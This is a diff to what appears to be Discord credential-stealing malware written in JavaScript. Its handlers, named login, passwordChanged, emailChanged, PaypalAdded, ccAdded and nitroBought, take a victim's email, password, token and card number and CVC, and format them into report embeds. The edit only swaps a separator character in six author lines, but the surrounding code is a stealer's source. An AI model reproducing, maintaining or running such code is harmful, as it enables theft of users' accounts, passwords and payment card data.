@@ -385,7 +385,7 @@ const login = async (email, password, token) => {
           },
         ],
         author: {
-          name: json.username + "#" + json.discriminator + "・" + json.id,
+          name: json.username + "#" + json.discriminator + " | " + json.id,
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
@@ -430,7 +430,7 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
           },
         ],
         author: {
-          name: json.username + "#" + json.discriminator + "・" + json.id,
+          name: json.username + "#" + json.discriminator + " | " + json.id,
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
@@ -475,7 +475,7 @@ const emailChanged = async (email, password, token) => {
           },
         ],
         author: {
-          name: json.username + "#" + json.discriminator + "・" + json.id,
+          name: json.username + "#" + json.discriminator + " | " + json.id,
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
@@ -517,7 +517,7 @@ const PaypalAdded = async (token) => {
           },
         ],
         author: {
-          name: json.username + "#" + json.discriminator + "・" + json.id,
+          name: json.username + "#" + json.discriminator + " | " + json.id,
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
@@ -559,7 +559,7 @@ const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
           },
         ],
         author: {
-          name: json.username + "#" + json.discriminator + "・" + json.id,
+          name: json.username + "#" + json.discriminator + " | " + json.id,
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
@@ -603,7 +603,7 @@ const nitroBought = async (token) => {
           },
         ],
         author: {
-          name: json.username + "#" + json.discriminator + "・" + json.id,
+          name: json.username + "#" + json.discriminator + " | " + json.id,
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
